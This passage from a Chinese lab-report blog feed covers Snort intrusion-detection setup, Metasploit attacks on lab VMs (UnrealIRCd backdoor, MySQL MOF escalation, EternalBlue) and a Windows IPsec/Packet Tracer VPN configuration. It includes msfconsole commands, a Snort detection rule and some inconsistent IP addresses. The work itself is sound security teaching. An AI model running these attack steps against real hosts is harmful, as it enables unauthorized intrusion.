pcre:"/DATE_FORMAT\x28\s*(\x22[^\x22]+\x25[^\x22]*\x22|\x27[^\x27]+\x25[^\x27]*\x27)/smi"; metadata:service mysql; reference:bugtraq,19032; reference:cve,2006-3469; reference:url,dev.mysql.com/doc/refman/5.0/en/news-5-0-21.html; classtype:attempted-dos; sid:8057; rev:2;)</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565765815890.png" alt="1565765815890"></p><p>检测<code>root login</code>, <code>show databases</code>, <code>create function</code>, <code>secure client overflow</code>等等攻击尝试，并产生对应的告警信息。</p><h2 id="snort-conf配置"><a href="#snort-conf配置" class="headerlink" title="snort.conf配置"></a><code>snort.conf</code>配置</h2><p>设置<code>output database</code>，记录所有<code>alert</code>和<code>log</code>文件到数据库</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766059427.png" alt="1565766059427"></p><p>并记录日志文件到数据库，可以从网站打开查看日志。</p><h2 id="snort其他组件"><a href="#snort其他组件" class="headerlink" title="snort其他组件"></a><code>snort</code>其他组件</h2><p>安装<code>adobd</code>、<code>jgraph</code>、<code>acid</code>（网页文件）组件。</p><p>配置<code>Acid</code>网页配置文件<code>acid_conf.php</code>，使其与<code>mysql</code>数据库匹配，并能输出日志和告警到网页端。</p><p>浏览器输入<code>http://localhost/acid/acid_db_setup.php</code>，初始化数据库。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766150653.png" alt="1565766150653"></p><h1 id="网络靶场攻击与检测"><a href="#网络靶场攻击与检测" class="headerlink" title="网络靶场攻击与检测"></a>网络靶场攻击与检测</h1><h2 id="靶场扫描检测"><a href="#靶场扫描检测" class="headerlink" title="靶场扫描检测"></a>靶场扫描检测</h2><h3 id="局域网设置"><a href="#局域网设置" class="headerlink" title="局域网设置"></a>局域网设置</h3><p><code>攻击机</code>和<code>靶机</code>、<code>snort</code>在同一局域网下。攻击机kali的ip地址为<code>192.168.43.257</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766422794.png" alt="1565766422794"></p><p>据此可知子网为<code>192.168.43.0/24</code></p><h3 id="攻击机nmap扫描局域网"><a href="#攻击机nmap扫描局域网" class="headerlink" title="攻击机nmap扫描局域网"></a>攻击机<code>nmap</code>扫描局域网</h3><p>攻击机<code>nmap</code>扫描<code>192.168.43.0/24</code>网段，发现该网段下共<code>19</code>台主机，其中图中MAC地址相同的主机为<code>honeyd</code>搭建的拓扑结构里面的虚拟主机，而不是此MAC地址的机器为具有漏洞的真实虚拟机。可见honeyd的MAC地址为<code>62:44:42:89:7D:46</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766497207.png" alt="1565766497207"></p><p>第一次扫描后honeyd的日志</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766512229.png" alt="1565766512229"></p><h2 id="攻击漏洞虚拟机"><a href="#攻击漏洞虚拟机" class="headerlink" title="攻击漏洞虚拟机"></a>攻击漏洞虚拟机</h2><h3 id="对metasploitable2漏洞虚拟机攻击"><a href="#对metasploitable2漏洞虚拟机攻击" class="headerlink" title="对metasploitable2漏洞虚拟机攻击"></a>对<code>metasploitable2</code>漏洞虚拟机攻击</h3><p><code>metasploitable2</code>的ip地址为<code>192.168.32.120</code>，首先对<code>6667</code>端口使用<code>unreal_ircd_3281_backdoor</code>模块，即<code>irc_3281_backdoor</code>漏洞。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766748326.png" alt="1565766748326"></p><p>成功植入后门，<code>getshell</code>:</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766767823.png" alt="1565766767823"></p><p>攻击机端控制漏洞机<code>192.168.43.12</code>0后，在根目录下执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir 77777777777777777</span><br></pre></td></tr></table></figure><p>创建了新目录</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766807924.png" alt="1565766807924"></p><p>在漏洞机可以看到已经被写入：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766822946.png" alt="1565766822946"></p><h3 id="对-win-xp-漏洞机攻击"><a href="#对-win-xp-漏洞机攻击" class="headerlink" title="对 win xp 漏洞机攻击"></a>对 <code>win xp</code> 漏洞机攻击</h3><ol><li><p>对局域网中第二个主机<code>192.168.43.59</code>检测端口，发现<code>3306</code>端口打开，由此推测存在<code>mysql</code>服务漏洞，随后检测<code>mysql版本</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766888821.png" alt="1565766888821"></p></li><li><p>扫描到<code>3306</code>端口开放后，使用<code>mysql_version</code>模块检测<code>mysql版本</code>，检测到是<code>5.5.19版本</code>，存在提权漏洞<code>CVE-2012-5613</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766949919.png" alt="1565766949919"></p></li><li><p><code>Metasploit</code>拥有如下模块，使用<code>mysql</code>中的<code>mysql_mof</code>对目标主机进行本地提权</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565766975491.png" alt="1565766975491"></p><p>设置用户名<code>root</code>, 密码<code>root</code>，<code>RHOSTS</code>为目标机<code>192.168.43.213</code>，<code>LHOST</code>监听主机为攻击机<code>192.168.43.247</code>，<code>LHOST</code>监听端口为<code>5012</code>，攻击漏洞虚拟机<code>192.168.43.213</code>，成功<code>getshell</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767036734.png" alt="1565767036734"></p><p>命令行如下，打开了<code>Meterpreter session</code>:</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767058474.png" alt="1565767058474"></p><p><code>getshell</code>之后，写入文件夹到C盘。在<code>winXP</code>漏洞机上发现了新文件夹</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767090009.png" alt="1565767090009"></p><p>最后让被<code>getshell</code>的漏洞机关机：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767122319.png" alt="1565767122319"></p><p>windows被迫关机 </p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767134174.png" alt="1565767134174"></p></li></ol><h3 id="对win-7漏洞机攻击"><a href="#对win-7漏洞机攻击" class="headerlink" title="对win 7漏洞机攻击"></a>对<code>win 7</code>漏洞机攻击</h3><ol><li><p>选择局域网中的第一台真机<code>192.168.43.59</code>，扫描该IP端口，如下图所示，可以发现<code>135</code>、<code>139</code>、<code>445</code>等端口开放。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767256750.png" alt="1565767256750"></p><p><code>nmap</code>扫描到该主机的<code>445</code>端口开放，用永恒之蓝模块检测</p></li><li><p>使用<code>smb_ms17_010</code>对漏洞机进行检测，设置目标主机为<code>192.168.43.59</code>，检测到<code>Host is likely VULNERABLE to MS17-010</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.43.59</span><br><span class="line">rhosts =&gt; 192.168.43.59</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 192.168.43.59:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.43.59:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767344496.png" alt="1565767344496"></p><p>扫描确认存在永恒之蓝漏洞</p></li><li><p>获取控制权，使用<code>ms17_010_eternalblue</code>模块<code>getshell</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767393800.png" alt="1565767393800"></p><p>添加文件</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767407235.png" alt="1565767407235"></p><p>在漏洞主机上发现了新建的文件夹</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767425902.png" alt="1565767425902"></p></li><li><p>图形界面渗透成功图示</p><p><code>192.168.43.59</code>为部署<code>永恒之蓝</code>漏洞的<code>win7</code>虚拟机，<code>192.168.43.213</code>为部署<code>mysql</code>漏洞的<code>winXP</code>虚拟机</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767471994.png" alt="1565767471994"></p><p><code>mysql</code>提权漏洞获得<code>shell</code>之后，可以取得<code>screenshot</code>屏幕截图</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767498529.png" alt="1565767498529"></p></li></ol><h2 id="snort检测"><a href="#snort检测" class="headerlink" title="snort检测"></a>snort检测</h2><h3 id="AWVS扫描检测"><a href="#AWVS扫描检测" class="headerlink" title="AWVS扫描检测"></a><code>AWVS</code>扫描检测</h3><p>攻击机kali使用<code>AWVS</code>扫描蜜罐虚拟机<code>192.168.43.154</code>的<code>80</code>端口</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767586483.png" alt="1565767586483"></p><p>浏览器URL输入<code>http://localhost/acid/acid_db_setup.php</code>，即<code>snort网页报告</code>，可以看到检测到扫描</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767619513.png" alt="1565767619513"></p><h3 id="NMAP扫描检测"><a href="#NMAP扫描检测" class="headerlink" title="NMAP扫描检测"></a><code>NMAP</code>扫描检测</h3><p>在扫描局域网时，<code>snort</code>检测到<code>nmap</code>扫描，攻击机为<code>192.168.43.247</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767660232.png" alt="1565767660232"></p><h3 id="Metasploit渗透攻击检测"><a href="#Metasploit渗透攻击检测" class="headerlink" title="Metasploit渗透攻击检测"></a>Metasploit渗透攻击检测</h3><p><code>445</code>端口检测到攻击<code>NETBIOS SMB-DS Trans Max Param DOS attempt</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767691050.png" alt="1565767691050"></p><p>对主机进行端口扫描，其实是使用了<code>nmap</code>工具，检测到<code>nmap ping sweep scan</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767716793.png" alt="1565767716793"></p><p>利用<code>SQL提权漏洞</code>进行渗透攻击，<code>Snort</code>检测到<code>MYSQL attack</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767738851.png" alt="1565767738851"></p><p>尝试建立<code>Meteroreter</code>会话时，<code>Snort</code>检测到<code>NMAP</code>扫描</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565767760977.png" alt="1565767760977"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Honedy </tag>
            
            <tag> Snort </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPN配置 实验报告</title>
      <link href="/VPN%E9%85%8D%E7%BD%AE-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/VPN%E9%85%8D%E7%BD%AE-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol><li>在<code>Windows IPSEC</code>配置实验中，通过抓包工具抓取<code>IKE SA</code>和<code>IPSEC SA</code>建立过程的数据包，并进行分析。</li><li>思考：IKE密钥协商过程是否存在安全威胁。</li><li><code>PacketTracer</code>里VPN配置实验<a id="more"></a></li></ol><h1 id="Windows-IPSEC配置"><a href="#Windows-IPSEC配置" class="headerlink" title="Windows IPSEC配置"></a>Windows IPSEC配置</h1><ol><li><p>配置环境：<code>windows xp</code> &amp; <code>windows 10</code></p></li><li><p>打开<code>Windows xp</code>虚拟机，通过<code>secpol.msc</code>打开本地安全设置。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750367517.png" alt="1565750367517"></p></li><li><p>在IP安全策略下右键，创建安全策略</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750386129.png" alt="1565750386129"></p></li><li><p>设置配置名称为<code>Levi</code>（个人随意）</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750413150.png" alt="1565750413150"></p><p>激活默认响应规则</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750451406.png" alt="1565750451406"></p><p>身份认证方法采用<code>此字符串用来保护密钥交换</code>，输入<code>123456</code>（可以换成其他内容）</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750472492.png" alt="1565750472492"></p></li><li><p>回到原来窗口，鼠标右键，指派</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750521942.png" alt="1565750521942"></p></li><li><p>鼠标右键，属性，添加规则并进行相应的配置</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750573154.png" alt="1565750573154"></p><p>选择此规则不指定隧道</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750733585.png" alt="1565750733585"></p><p>选择所有网络连接</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750738506.png" alt="1565750738506"></p><p>身份验证方法采用<code>此字符串用来保护密钥交换</code>，输入字符串：<code>abcdef</code>（可换成其它内容）</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750726353.png" alt="1565750726353"></p><p>IP筛选列表选择<code>所有IP通讯量</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750719310.png" alt="1565750719310"></p><p>筛选器操作选择<code>需要安全</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750713094.png" alt="1565750713094"></p><p>点击下一步完成</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750707568.png" alt="1565750707568"></p></li><li><p>至此，<code>Windows xp</code>下的<code>IPSEC</code>配置完成，操作过程中没有报错。</p></li><li><p>以同样的方式配置<code>windows 10</code>下的<code>IPSEC</code>，这里与<code>windows xp</code>配置大致相同，截图只用于说明不同点。通过<code>secpol.msc</code>打开<code>windows 10</code>本地安全设置</p></li><li><p>在IP安全策略下右键，创建安全策略</p></li><li><p>设置配置名称为<code>Levis</code>（个人随意），由于激活默认响应规则仅限于windows早期版本，故不选择激活默认响应规则，过程中，没有身份认证选择</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750867578.png" alt="1565750867578"></p></li><li><p>点击默认设置，一直到属性窗口，添加规则：选择此规则不指定隧道、选择所有网络连接、在IP筛选列表中点击添加，名称为<code>新IP筛选列表</code>，并点击添加，之后选择默认操作</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750894238.png" alt="1565750894238"></p></li><li><p>选择刚刚建立的IP筛选列表，点击下一步</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750912175.png" alt="1565750912175"></p><p>选择<code>添加IP筛选器</code>操作, 选择<code>协商安全</code>,继续默认操作</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565750927973.png" alt="1565750927973"></p></li><li><p>选择刚刚建立的新筛选器操作，点击下一步</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751013806.png" alt="1565751013806"></p><p>身份验证方法采用<code>此字符串用来保护密钥交换</code>，输入字符串：<code>abcdef</code>(与上面的相同)</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751045367.png" alt="1565751045367"></p><p>单击下一步，选择默认操作直至筛选器配置完成</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751059737.png" alt="1565751059737"></p></li><li><p>回到原来窗口，鼠标右键，分配，至此，<code>Windows 10</code>下的<code>IPSEC</code>配置完成，操作过程中没有报错</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751094123.png" alt="1565751094123"></p></li></ol><h1 id="开始通信"><a href="#开始通信" class="headerlink" title="开始通信"></a>开始通信</h1><ol><li><p>查看<code>win xp</code>和<code>win 10</code>的IP地址分别为<code>192.168.88.150</code>和<code>192.168.88.1</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751203055.png" alt="1565751203055"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751209608.png" alt="1565751209608"></p></li><li><p>关闭<code>win 10</code>的<code>IPSEC服务</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751231217.png" alt="1565751231217"></p></li><li><p>使用<code>win 10</code> <code>ping</code> <code>win xp</code>，请求超时，<code>ping</code>不通</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751256734.png" alt="1565751256734"></p></li><li><p>对通信过程进行抓包，可以看到<code>win 10</code>一直请求<code>IPsec SA</code>但总不成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751296152.png" alt="1565751296152"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751303769.png" alt="1565751303769"></p></li><li><p>重新开启<code>win 10</code>的<code>IPSEC服务</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751347220.png" alt="1565751347220"></p></li><li><p>使用<code>win 10</code>重新<code>ping</code> <code>win xp</code>，发现成功<code>ping</code>通</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751382839.png" alt="1565751382839"></p></li><li><p>对通信过程进行抓包，由于此时<code>win xp</code>和<code>win10</code>都采用的是默认的<code>esp加密</code>，所以抓包显示的是<code>esp包</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751410628.png" alt="1565751410628"></p></li><li><p><code>Win 10</code>和<code>win xp</code>都设置仅<code>AH通信</code>，不经过<code>ESP加密</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751464369.png" alt="1565751464369"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751469876.png" alt="1565751469876"></p></li><li><p>继续使用<code>win 10</code> <code>ping</code> <code>win xp</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751524436.png" alt="1565751524436"></p></li><li><p>对通信过程进行抓包，发现没有<code>ESP加密</code>后数据包格式为<code>ICMP</code>，数据为<code>abcdef</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751552052.png" alt="1565751552052"></p></li><li><p><code>Win 10</code>和<code>win xp</code>都设置仅<code>esp认证</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751600836.png" alt="1565751600836"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751605269.png" alt="1565751605269"></p></li><li><p>继续使用<code>win 10</code> <code>ping</code> <code>win xp</code>，并对通信过程进行抓包，数据没有通过<code>esp加密</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751650128.png" alt="1565751650128"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751654675.png" alt="1565751654675"></p></li><li><p>分析<code>IKE SA</code>和<code>IPSEC SA</code>建立过程</p><p>要建立<code>IPSec连接</code>，首先要协商一个<code>IKE SA</code>，然后在<code>IKE SA</code>的基础上协商<code>IPSec SA</code></p><ol><li><p>IKE SA建立分为三个阶段</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751806471.png" alt="1565751806471"></p><ol><li><p><code>SA交换</code>，协商确认有关安全策略。该过程进行安全协商</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751818033.png" alt="1565751818033"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751825295.png" alt="1565751825295"></p></li><li><p>密钥交换阶段，主要交换密钥<code>Diffie-Hellman公共值</code>。数据包中的<code>Key Exchange</code>用于交换各自加密生成的<code>主密钥</code>；<code>Nonce</code>使用了随机数，防止重放攻击；加密所用的密钥为<code>ipsec</code>中设定的<code>预共享密钥</code>； <code>NAT-D</code>为双方的ip+端口的Hash值。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751889825.png" alt="1565751889825"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751893903.png" alt="1565751893903"></p></li><li><p>ID信息和认证数据交换，进行身份认证，对第一阶段交换内容的认证。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751913263.png" alt="1565751913263"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565751919016.png" alt="1565751919016"></p></li></ol></li><li><p><code>IPSec SA</code>建立分为两个阶段，都是加密数据，无法查看。用到了<code>Quick-Mode</code>，目的是在两个对等体间协商一组一致的参数来创建<code>IPSec SA</code>，用于真实数据的加解密，并且在此进行<code>PFS</code>，<code>PFS</code>及在<code>Quick-Mode</code>重新做<code>DH</code>的交换，产生新的密钥用于<code>IPSec</code>数据的加密。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752070936.png" alt="1565752070936"></p></li></ol></li></ol><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>Q：IKE密钥协商过程是否存在安全威胁？</p><p>A：<code>IPSec密钥交换过程</code>分为两个独立阶段。第一阶段通信双方彼此建立一个通过身份认证和安全保护的隧道，称为<code>ISAKMP SA</code>。只要<code>ISAKMP SA</code>建立起来，所有发起方和应答方之间的<code>IKE</code>通信信息都通过加密、完整性检查和认证的方法受到保护。第二阶段的建立是为特定的<code>Internet</code>安全协议(如<code>IPSec</code>等)创建安全关联(<code>IPSec SA</code>)。IKE第一阶段的目的是建立一个<code>安全隧道</code>，使得第二阶段的协商可以秘密地进行。两台主机之间可以同时建立多个<code>ISAKMP SA</code>，一个<code>ISAKMP SA</code>也可以创建多个<code>IPSec SA</code>，<code>ISAKMP SA</code>的结束不会影响它创建的<code>IPSec SA</code>发生作用。这种密钥协商过程是存在着漏洞的，可以通过中间人攻击和拒绝服务攻击实现漏洞利用。</p><h1 id="PacketTracer-VPN配置"><a href="#PacketTracer-VPN配置" class="headerlink" title="PacketTracer VPN配置"></a>PacketTracer VPN配置</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul><li>系统：<code>Windows xp</code></li><li>软件工具：思科官方模拟器<code>Packet Tracer 5.3</code></li><li>模拟实体：2台<code>cisco2800</code>系列路由器、2台24端口以太网交换机和若干PC电脑</li></ul><h2 id="安装Packet-Tracer-5-3"><a href="#安装Packet-Tracer-5-3" class="headerlink" title="安装Packet Tracer 5.3"></a>安装<code>Packet Tracer 5.3</code></h2><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752499838.png" alt="1565752499838"></p><h2 id="配置安全策略"><a href="#配置安全策略" class="headerlink" title="配置安全策略"></a>配置安全策略</h2><p>​        新建一条安全策略<code>PacketTracer</code>，添加IP安全规则，隧道方式为<code>不指定隧道</code>，网络类型选择<code>所有网络连接</code>，身份验证方法选择<code>用字符串保护密钥交换</code>，输入：<code>123</code>；进入IP筛选器列表的配置项，设置一个新的IP筛选器列表，新建一个IP筛选器，将<code>我的IP地址</code>作为源地址，将<code>任何IP地址</code>作为目标地址，在<code>选择协议类型</code>中选中<code>任意</code>，新建一个筛选操作，设置为<code>协商安全</code>，选中<code>不和不支持IPSec的计算机通讯</code>，以要求必须在<code>IPSec</code>基础上进行连接，<code>IP通讯安全设施</code>中选择选择<code>自定义</code>，然后点击<code>设置</code>选择如下图，选择默认直至配置完成</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752762492.png" alt="1565752762492"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752769614.png" alt="1565752769614"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752775749.png" alt="1565752775749"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752781587.png" alt="1565752781587"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752791438.png" alt="1565752791438"></p><h2 id="初始化配置路由器"><a href="#初始化配置路由器" class="headerlink" title="初始化配置路由器"></a>初始化配置路由器</h2><ol><li><p>打开<code>cisco模拟器</code>，在模拟器窗口工具栏下选择<code>file--new</code>。在左下角设备栏选取路由器图标<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752837430.png" alt="1565752837430">)将<code>cisco2811路由器</code><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752870121.png" alt="1565752870121">拖到工作区域，单击工作区域的路由器图标，选择<code>CLI项</code>，弹出如图所示界面</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752887288.png" alt="1565752887288"></p><p>输入no,回车两次</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565752901653.png" alt="1565752901653"></p></li><li><p>进入路由器特权模式配置路由器网卡IP，输入命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Router&gt;enable&#x2F;&#x2F;进入特权模式，只有在特权模式下才可以对路由器进行配置</span><br><span class="line">Router#configure terminal&#x2F;&#x2F;进入配置状态，通过端口进行配置</span><br><span class="line">Router(config)# interface fastEthernet 0&#x2F;0&#x2F;&#x2F;进入端口f0&#x2F;0 </span><br><span class="line">Router(config-if)#ip address 10.0.0.1 255.255.255.0#配置网卡f0&#x2F;0的ip地址和子网掩码</span><br><span class="line">Router(config-if)#no shutdown&#x2F;&#x2F;开启端口f0&#x2F;0</span><br><span class="line">Router(config-if)#end&#x2F;&#x2F;返回特权模式</span><br><span class="line">Router#configure terminal&#x2F;&#x2F;进入配置状态，通过端口进行配置</span><br><span class="line">Router(config)# interface fastEthernet 0&#x2F;1  &#x2F;&#x2F;进入端口f0&#x2F;1</span><br><span class="line">Router(config-if)#ip address 192.168.1.1 255.255.255.0  &#x2F;&#x2F;配置网卡f0&#x2F;1的ip地址和子网掩码 </span><br><span class="line">Router(config-if)#no shutdown&#x2F;&#x2F;开启端口f0&#x2F;1</span><br><span class="line">Router(config-if)#end&#x2F;&#x2F;返回特权模式</span><br></pre></td></tr></table></figure><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753153340.png" alt="1565753153340"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753169156.png" alt="1565753169156"></p></li><li><p>初始配置<code>router 0</code>完成，根据<code>router 0</code>的配置过程完成<code>router 1</code>的配置，其中<code>router 1</code>的<code>f0/0</code>端口IP为<code>10.0.0.2/24</code>, <code>router 1</code>的<code>f0/1</code>端口的IP地址为<code>192.168.2.1/24</code></p></li><li><p>配置完成后，点击<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753230234.png" alt="1565753230234">)选择<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753259250.png" alt="1565753259250">将<code>router 0</code>和<code>router 1</code>的<code>f0/0</code>端口连接</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753295977.png" alt="1565753295977"></p></li></ol><h2 id="搭建网络环境"><a href="#搭建网络环境" class="headerlink" title="搭建网络环境"></a>搭建网络环境</h2><ol><li><p>在模拟器左下角选择<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753335417.png" alt="1565753335417">)选取<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753354773.png" alt="1565753354773">拖到绘图工作区，双击<code>PC图标</code>，选择<code>Desktop</code>，如图所示</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753392229.png" alt="1565753392229"></p></li><li><p>选择<code>IP Configuration</code>，配置PC的IP地址和子网掩码，如图所示</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565753511671.png" 